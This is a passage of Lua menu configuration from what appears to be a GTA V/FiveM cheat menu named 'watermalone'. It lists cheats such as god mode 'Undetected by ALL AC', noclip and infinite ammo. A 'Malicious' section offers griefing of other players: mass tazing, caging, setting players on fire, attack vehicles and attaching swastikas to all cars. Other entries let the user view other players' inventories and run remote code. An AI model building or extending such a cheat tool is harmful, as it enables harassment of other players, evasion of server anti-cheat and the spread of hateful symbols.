            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [Infinite Ammo, Never run out of bullets]", tab = "WEP", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Wep_infammo", label = "Infinite Ammo", func = "wmlua.F.WEPInfAmmo", efunc = wmlua.F.WEPInfAmmo, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [No Reload, Never reload your current weapon]", tab = "WEP", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Wep_noreload", label = "No Reload", func = "wmlua.F.WEPNoReload", efunc = wmlua.F.WEPNoReload, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [Rapid Fire, Increases the rate of fire for the current weapon]", tab = "WEP", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Wep_rapidfire", label = "Rapid Fire", func = "wmlua.F.WEPRapidfire", efunc = wmlua.F.WEPRapidfire, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Weapon [One Shot, Hitman mode]", tab = "WEP", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Wep_oneshot", label = "One Shot", func = "wmlua.F.WEPOneShot", efunc = wmlua.F.WEPOneShot, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [No Combat Stance, prevents you from going into a combat stance after shooting / melee]", tab = "MIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Mis_nocombatstance", label = "No Combat Stance", func = "wmlua.F.MISNoCombatStance", efunc = wmlua.F.MISNoCombatStance, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [Infinite Roll, Allows you to combat roll infinitely]", tab = "MIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Mis_infiniteroll", label = "Infinite Roll", func = "wmlua.F.MISInfiniteRoll", efunc = wmlua.F.MISInfiniteRoll, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [OPK AI, Brings all known peds infront of you]", tab = "MIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Mis_opkai", label = "OPK AI", func = "wmlua.F.MISOpkAI", efunc = wmlua.F.MISOpkAI, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [No Vehicle Collisions, Allows you to zoom through other vehicles without crashing]", tab = "MIS", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Mis_noaicollisions", label = "No Vehicle Collisions", func = "wmlua.F.MISNoAICollisions", efunc = wmlua.F.MISNoAICollisions, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [Noclip, No Collide with the world and fly to your hearts content]", tab = "MIS", ctrlType = "toggle", bind = {210,14}, name = "wmlua.V.Mis_noclip", label = "Noclip", func = "wmlua.F.MISNoClip", efunc = wmlua.F.MISNoClip, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [Remove Collision from Objects, Removes collision from existing objects]", tab = "MIS", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mis_applynoobjcollision", label = "Remove Collision from Objects", func = "wmlua.F.MISApplyNoCollision", efunc = wmlua.F.MISApplyNoCollision, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [Apply Collision to Objects, Adds collision to existing objects]", tab = "MIS", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mis_applyobjcollision", label = "Apply Collision to Objects", func = "wmlua.F.MISApplyCollision", efunc = wmlua.F.MISApplyCollision, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [Fix Interior, Fixes interiors when they are bugged for you]", tab = "MIS", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mis_fixinterior", label = "Fix Interior", func = "wmlua.F.MISFixInterior", efunc = wmlua.F.MISFixInterior, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [Teleport to Coords, Teleports you to X,Y,Z Coordinates", tab = "MIS", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mis_tptocoords", label = "Teleport to Coords", func = "wmlua.F.MISTeleportToCoordinates", efunc = wmlua.F.MISTeleportToCoordinates, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [Teleport to Waypoint, Teleports you to a waypoint set on the map]", tab = "MIS", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mis_tptomp", label = "Teleport to Waypoint", func = "wmlua.F.MISTeleportToWaypoint", efunc = wmlua.F.MISTeleportToWaypoint, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [Waypoint to Coords, Draws a waypoint to specified X,Y,Z Coordinates]", tab = "MIS", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mis_wptocoords", label = "Set waypoint to coords", func = "wmlua.F.MISCoordinatesToWaypoint", efunc = wmlua.F.MISCoordinatesToWaypoint, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [Superman, Allows you to fly around like superman]", tab = "MIS", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mis_superman", label = "Superman", func = "wmlua.F.MISSuperMan", efunc = wmlua.F.MISSuperMan, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [Enter Solo Session, Allows you to be in your own session, with no other players]", tab = "MIS", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mis_exittosolo", label = "Enter Solo Session", func = "wmlua.F.MISSolo", efunc = wmlua.F.MISSolo, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "MISC [Unload Menu, Unloads watermalone's code entirely]", tab = "MIS", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mis_exit", label = "Unload Menu", func = "wmlua.F.Unload_wmlua", efunc = wmlua.F.Unload_wmlua, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Disable Vehicles, Disables players from using any vehicle]", tab = "MAL", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Mal_disabledcars", label = "Disable Vehicles", func = "wmlua.F.MALDisableCars", efunc = wmlua.F.MALDisableCars, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Delete All Vehicles, Deletes all vehicles that exist to your client]", tab = "MAL", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Mal_deletecars", label = "Delete All Vehicles", func = "wmlua.F.MALDeleteCars", efunc = wmlua.F.MALDeleteCars, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Taze All Players, Allows you to taze all the players on the server]", tab = "MAL", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Mal_tazeplayers", label = "Taze All Repeatedly", func = "wmlua.F.OTHTazePlayers", efunc = wmlua.F.OTHTazePlayers, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {"Big Block","Big Tube","El Tree","FIB N IAA","Papi Money's Factory","Custom"}, active = false, advertname = "Malicious [Attachs obj to all cars, allows you to attach a specified object either custom or from list to all cars]", tab = "MAL", ctrlType = "selector", bind = {9001}, name = "wmlua.V.Mal_objcars", label = "Attach to all cars", func = "wmlua.F.MALObjCars", efunc = wmlua.F.MALObjCars, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {"Big Block","Big Tube","El Tree","FIB N IAA","Papi Money's Factory","Custom"}, active = false, advertname = "Malicious [Attachs obj to all peds, allows you to attach a specified object either custom or from list to all peds]", tab = "MAL", ctrlType = "selector", bind = {9001}, name = "wmlua.V.Mal_objpeds", label = "Attach to all peds", func = "wmlua.F.MALObjPeds", efunc = wmlua.F.MALObjPeds, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {"Big Block","Big Tube","El Tree","FIB N IAA","Papi Money's Factory","Custom"}, active = false, advertname = "Malicious [Attachs obj to all objs, allows you to attach a specified object either custom or from list to all objs]", tab = "MAL", ctrlType = "selector", bind = {9001}, name = "wmlua.V.Mal_objobjs", label = "Attach to all objs", func = "wmlua.F.MALObjObjs", efunc = wmlua.F.MALObjObjs, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Launch All Vehicles, Launch all vehicles that exist to your client into the sky]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_launchcars", label = "Launch All Cars", func = "wmlua.F.MALLaunchCars", efunc = wmlua.F.MALLaunchCars, MultiTarget = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Drag Blame, Hate someone? Attach yourself to them and blame them for their mistake]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_dragblame", label = "Drag Blame", func = "wmlua.F.MALDragBlame", efunc = wmlua.F.MALDragBlame, MultiTarget = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Cage Player, Allows you to cage a player of your choice]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_cageplayer", label = "Cage Player", func = "wmlua.F.MALCagePlayer", efunc = wmlua.F.MALCagePlayer, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Attach Spam Objects, Attaches alot of random props to a player]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_spam", label = "Attach Spam Objects Player", func = "wmlua.F.MALObjectAttachSpamPlayer", efunc = wmlua.F.MALObjectAttachSpamPlayer, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Attach Swastikas to All Vehicles, Allows you to attach a swastika to all the vehicles on the server]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_spamall", label = "Attach Swastikas to All Vehicles", func = "wmlua.F.MALObjectAttachSpamVehicleAll", efunc = wmlua.F.MALObjectAttachSpamVehicleAll, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Attack with NPC Hitmen, Recruits nearby peds to attack a target with a specified weapon]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_pedattack", label = "Attack With NPC Hitmen", func = "wmlua.F.MALPedAttack", efunc = wmlua.F.MALPedAttack, MultiTarget = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Attack with NPC Clone Hitmen, Spawns clones of your target to attack your target with a specified weapon]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_cloneattack", label = "Attack With NPC Clone Hitmen", func = "wmlua.F.MALCloneAttack", efunc = wmlua.F.MALCloneAttack, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Send Attack Plane after Player, Sends a plane after a target]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_planeattack", label = "Send Attack Plane after Player", func = "wmlua.F.MALAttackPlane", efunc = wmlua.F.MALAttackPlane, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Send Attack Heli after Player, Sends an attack heli after a target]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_heliattack", label = "Send Attack Heli after Player", func = "wmlua.F.MALAttackHeli", efunc = wmlua.F.MALAttackHeli, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Send Attack Tank after Player, Sends an attack tank after a target]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_tankattack", label = "Send Attack Tank after Player", func = "wmlua.F.MALAttackTank", efunc = wmlua.F.MALAttackTank, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Set Player on Fire, Burn a player you set on fire]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_setonfire", label = "Set Player on Fire", func = "wmlua.F.MALSetOnFire", efunc = wmlua.F.MALSetOnFire, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Malicious [Put out fire on player, Deletes the fire from the player you set on fire]", tab = "MAL", ctrlType = "button", bind = {9001}, name = "wmlua.V.Mal_putoutfire", label = "Put out fire on Player", func = "wmlua.F.MALPutOutFire", efunc = wmlua.F.MALPutOutFire, MultiTarget = true},
            
            {tempval = 1, realval = 1, optlist = {"Default","Kyler","Mario","Luigi","Slav","Tron","Classic Vito","Classic Vito 2","Leopard Guy","Basic Guy","Basic Guy 2","Basic Guy 3","Basic Guy 4","Basic Guy 5","Terrorist","Robber","Biker Guy","XMAS","Green Alien","Purple Alien"}, active = false, advertname = "Player [Preset Outfits, Allows you to choose a preset outfit from WM so you do not have to spend time on it]", tab = "PLY", ctrlType = "selector", bind = {9001}, name = "wmlua.V.Ply_outfit", label = "Preset Outfit", func = "wmlua.F.PLYOutfit", efunc = wmlua.F.PLYOutfit, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Randomize Outfit, Randomizes your current outfit]", tab = "PLY", ctrlType = "button", bind = {9001}, name = "wmlua.V.Ply_outfitrandomize", label = "Randomize Outfit", func = "wmlua.F.PLYOutfitRandomize", efunc = wmlua.F.PLYOutfitRandomize, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Clean self, cleans your players ped]", tab = "PLY", ctrlType = "button", bind = {9001}, name = "wmlua.V.Ply_clean", label = "Clean self", func = "wmlua.F.PLYClean", efunc = wmlua.F.PLYClean, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Heal, Sets your health back to full]", tab = "PLY", ctrlType = "button", bind = {9001}, name = "wmlua.V.Ply_heal", label = "Heal", func = "wmlua.F.PLYHeal", efunc = wmlua.F.PLYHeal, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Armor, Gives you armor if you don't have any, takes it away if you do]", tab = "PLY", ctrlType = "button", bind = {9001}, name = "wmlua.V.Ply_armor", label = "Armor", func = "wmlua.F.PLYArmor", efunc = wmlua.F.PLYArmor, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Fake Dead, Appear dead to other players which may prohibit certain actions]", tab = "PLY", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Ply_fakedead", label = "Fake Dead", func = "wmlua.F.PLYFakeDead", efunc = wmlua.F.PLYFakeDead, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Anti Stun, Prevents you from being tazed]", tab = "PLY", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Ply_antistun", label = "Anti Stun", func = "wmlua.F.PLYAntiStun", efunc = wmlua.F.PLYAntiStun, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [No Ragdoll, Prevents you from ragdolling]", tab = "PLY", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Ply_antiragdoll", label = "No Ragdoll", func = "wmlua.F.PLYAntiragdoll", efunc = wmlua.F.PLYAntiragdoll, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Infinite Stamina, Never run out of breath]", tab = "PLY", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Ply_infstamina", label = "Infinite Stamina", func = "wmlua.F.PLYInfStamina", efunc = wmlua.F.PLYInfStamina, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Anti Headshot, Makes all headshots to you count as body shots towards you]", tab = "PLY", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Ply_antiheadshot", label = "Anti Headshot", func = "wmlua.F.PLYAntiHeadshot", efunc = wmlua.F.PLYAntiHeadshot, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [God Mode, Never die & Undetected by ALL AC]", tab = "PLY", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Ply_godmode", label = "God Mode", func = "wmlua.F.PLYGodmode", efunc = wmlua.F.PLYGodmode, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Demi Godmode, Die by certain things]", tab = "PLY", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Ply_demigodmode", label = "Demi God Mode", func = "wmlua.F.PLYDemiGodmode", efunc = wmlua.F.PLYDemiGodmode, MultiTarget = false, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Invisible, Makes your character be invisible]", tab = "PLY", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.Ply_invisibility", label = "Invisibility", func = "wmlua.F.PLYInvisibility", efunc = wmlua.F.PLYInvisibility, MultiTarget = false, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Revive, Allows you to come back to life]", tab = "PLY", ctrlType = "button", bind = {9001}, name = "wmlua.V.Ply_revive", label = "Revive", func = "wmlua.F.PLYRevive", efunc = wmlua.F.PLYRevive, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Change Model, Allows you to change your player model]", tab = "PLY", ctrlType = "button", bind = {9001}, name = "wmlua.V.Ply_morphother", label = "Change Model", func = "wmlua.F.PLYChangeModel", efunc = wmlua.F.PLYChangeModel, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Provoke Killers, Allows you to 'hire' killers on yourself]", tab = "PLY", ctrlType = "button", bind = {9001}, name = "wmlua.V.Ply_hirekillers", label = "Provoke Killers", func = "wmlua.F.PLYProvokeKillers", efunc = wmlua.F.PLYProvokeKillers, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Insurance Fraud, Makes it easy to blame people for VDM, etc]", tab = "PLY", ctrlType = "button", bind = {9001}, name = "wmlua.V.Ply_insurancefraud", label = "Insurance Fraud", func = "wmlua.F.PLYInsuranceFraud", efunc = wmlua.F.PLYInsuranceFraud, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Player [Suicide, Allows you to kill yourself]", tab = "PLY", ctrlType = "button", bind = {9001}, name = "wmlua.V.Ply_suicide", label = "Suicide", func = "wmlua.F.PLYSuicide", efunc = wmlua.F.PLYSuicide, MultiTarget = false},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Spectate Player, Allows you to spectate another player]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_spec", label = "Spectate Player", func = "wmlua.F.OTHSpectatePlayer", efunc = wmlua.F.OTHSpectatePlayer, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Give Health, Allows you to give a selected player health packs]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_healplayer", label = "Give Health", func = "wmlua.F.OTHHealPlayer", efunc = wmlua.F.OTHHealPlayer, MultiTarget = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Give Armor, Allows you to give a selected player armor]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_armorplayer", label = "Give Armor", func = "wmlua.F.OTHArmorPlayer", efunc = wmlua.F.OTHArmorPlayer, MultiTarget = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Teleport In Players Car, Allows you to teleport in a selected players car]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_tptoothercar", label = "Teleport In Players Car", func = "wmlua.F.OTHTPToPlayerCar", efunc = wmlua.F.OTHTPToPlayerCar, MultiTarget = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Teleport to Player, Allows you to teleport to a player]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_tptoother", label = "Teleport To Player", func = "wmlua.F.OTHTPToPlayer", efunc = wmlua.F.OTHTPToPlayer, MultiTarget = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Kick Out Driver, Allows you to kick out the driver of a car]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_kickdriver", label = "Kick Out Driver", func = "wmlua.F.OTHKickDriver", efunc = wmlua.F.OTHKickDriver, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Ai Vehicle Thief, Makes an AI Steal the desired players vehicle]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_aithief", label = "AI Vehicle Thief", func = "wmlua.F.OTHAiThief", efunc = wmlua.F.OTHAiThief, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Loop Task Clear on Player, Ends the task of a player indefinitely]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_freezeplayer", label = "Loop Task Clear on Player", func = "wmlua.F.OTHFreezePlayer", efunc = wmlua.F.OTHFreezePlayer, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Remove player from task clear loop list, Reverses the effect of task clearing a player]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_unfreezeplayer", label = "Remove player from task clear loop list", func = "wmlua.F.OTHUnfreezePlayer", efunc = wmlua.F.OTHUnfreezePlayer, MultiTarget = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Track Player, Allows you to track a player by waypoint]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_trackother", label = "Track Player", func = "wmlua.F.OTHTrackOther", efunc = wmlua.F.OTHTrackOther, MultiTarget = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Copy Appearance, Allows you to copy the appearance of a selected player]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_morph_to_other", label = "Copy Appearance", func = "wmlua.F.OTHMorphIntoPlayer", efunc = wmlua.F.OTHMorphIntoPlayer, MultiTarget = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Give All Weapons, Gives all weapons to a selected player]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_giveallweps", label = "Give All Weapons", func = "wmlua.F.OTHGiveAllWeps", efunc = wmlua.F.OTHGiveAllWeps, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Remove All Weapons, Removes all weapons of a selected player or all]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_removeallweps", label = "Remove All Weapons", func = "wmlua.F.OTHRemoveAllWeps", efunc = wmlua.F.OTHRemoveAllWeps, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Give Weapon, Allows you to give a specific weapon to a player]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_givewep", label = "Give Weapon", func = "wmlua.F.OTHGiveWep", efunc = wmlua.F.OTHGiveWep, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Remove Weapon, Allows you to remove a specific weapon from a player]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_removewep", label = "Remove Weapon", func = "wmlua.F.OTHRemoveWep", efunc = wmlua.F.OTHRemoveWep, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Clear Ped Tasks, Allows you to clear the current task of a selected player]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_clearpedtasks", label = "Clear Ped Tasks", func = "wmlua.F.OTHClearPedTasks", efunc = wmlua.F.OTHClearPedTasks, MultiTarget = true, Unsafe = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "Others [Taze Player, Allows you to taze the selected player]", tab = "OTH", ctrlType = "button", bind = {9001}, name = "wmlua.V.Oth_tazeplayer", label = "Taze Player", func = "wmlua.F.OTHTazePlayer", efunc = wmlua.F.OTHTazePlayer, MultiTarget = true},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [Load ESX (Dynamic), Loads ESX Functions for use]", tab = "ESX", ctrlType = "button", bind = {9001}, name = "wmlua.V.ESX_load", label = "Load ESX", func = "wmlua.F.ESXLoad", efunc = wmlua.F.ESXLoad, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [Play Sound, Attempts to play sounds for others (Dynamic)]", tab = "ESX", ctrlType = "button", bind = {9001}, name = "wmlua.V.ESX_hifi", label = "Play Sound", func = "wmlua.F.ESXHifiMusicStart", efunc = wmlua.F.ESXHifiMusicStart, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [Fix skelly (Dynamic), Fixes damage applied to you via skelly system]", tab = "ESX", ctrlType = "button", bind = {9001}, name = "wmlua.V.ESX_skeletalfix", label = "Fix Skelly", func = "wmlua.F.ESXSkeletalFix", efunc = wmlua.F.ESXSkeletalFix, MultiTarget = false, codeExecution = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [Send Message (Dynamic), Allows you to send notifications to other players]", tab = "ESX", ctrlType = "button", bind = {9001}, name = "wmlua.V.ESX_sendmessage", label = "Send Message", func = "wmlua.F.ESXSendMessage", efunc = wmlua.F.ESXSendMessage, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [View inventory (Dynamic), Allows you to view inventories of other players]", tab = "ESX", ctrlType = "button", bind = {9001}, name = "wmlua.V.ESX_viewinventory", label = "View Inventory", func = "wmlua.F.ESXViewInventory", efunc = wmlua.F.ESXViewInventory, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [Revive (Dynamic), Allows you to revive yourself via ESX]", tab = "ESX", ctrlType = "button", bind = {9001}, name = "wmlua.V.ESX_revive", label = "Revive", func = "wmlua.F.ESXRevive", efunc = wmlua.F.ESXRevive, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [Mythic Heal Limbs (Dynamic), Allows you to heal your limbs from the Mythic Hospital Resource]", tab = "ESX", ctrlType = "button", bind = {9001}, name = "wmlua.V.ESX_healLimbs", label = "Mythic Heal Limbs", func = "wmlua.F.ESXHealLimbs", efunc = wmlua.F.ESXHealLimbs, MultiTarget = false, codeExecution = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [Invite Meme (Dynamic)]", tab = "ESX", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.ESX_invitememe", label = "Invite Meme", func = "wmlua.F.ESXInviteMeme", efunc = wmlua.F.ESXInviteMeme, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [Never Hungry / Thirsty (Dynamic), Allows you to never be hungry or thirsty]", tab = "ESX", ctrlType = "toggle", bind = {9001}, name = "wmlua.V.ESX_neverhungry", label = "No Hunger or Thirst", func = "wmlua.F.ESXNoHunger", efunc = wmlua.F.ESXNoHunger, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [Open Skin Menu (Dynamic), Opens the ESX_SKIN Menu that you get upon registering]", tab = "ESX", ctrlType = "button", bind = {9001}, name = "wmlua.V.ESX_openskinmenu", label = "Open skin menu", func = "wmlua.F.ESXSkin", efunc = wmlua.F.ESXSkin, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [Change Others Character Name (Dynamic), Allows you to change others characters name via ESX]", tab = "ESX", ctrlType = "button", bind = {9001}, name = "wmlua.V.ESX_changecharname", label = "Change others character name", func = "wmlua.F.ESXChangeCharName", efunc = wmlua.F.ESXChangeCharName, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [View Car Dealer Info, Allows you to view info such as car names & spawn codes]", tab = "ESX", ctrlType = "button", bind = {9001}, name = "wmlua.V.ESX_viewcarinfo", label = "View vehicle dealer info", func = "wmlua.F.ESXViewVehicleshop", efunc = wmlua.F.ESXViewVehicleshop, MultiTarget = true},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "ESX [View Player Info, Allows you to view player info such as job, money, inventory, etc]", tab = "ESX", ctrlType = "button", bind = {9001}, name = "wmlua.V.ESX_viewinfo", label = "View other players info", func = "wmlua.F.ESXViewInfo", efunc = wmlua.F.ESXViewInfo, MultiTarget = true},
            
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AI [Stop Tasks, Stops your player's AI Task]", tab = "AI", ctrlType = "button", bind = {9001}, name = "wmlua.V.AI_stop", label = "Stop Tasks", func = "wmlua.F.AIStop", efunc = wmlua.F.AIStop, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AI [Wander Around, Tasks your player to 'wander around' aimlessly]", tab = "AI", ctrlType = "button", bind = {9001}, name = "wmlua.V.AI_wander", label = "Wander Around", func = "wmlua.F.AIWander", efunc = wmlua.F.AIWander, MultiTarget = false},
            {tempval = 1, realval = 1, optlist = {}, active = false, advertname = "AI [Travel to Waypoint, Tasks your player to drive to set waypoint on map]", tab = "AI", ctrlType = "button", bind = {9001}, name = "wmlua.V.AI_gotowaypoint", label = "Travel to Waypoint", func = "wmlua.F.AIGotoWaypoint", efunc = wmlua.F.AIGotoWaypoint, MultiTarget = false},
            
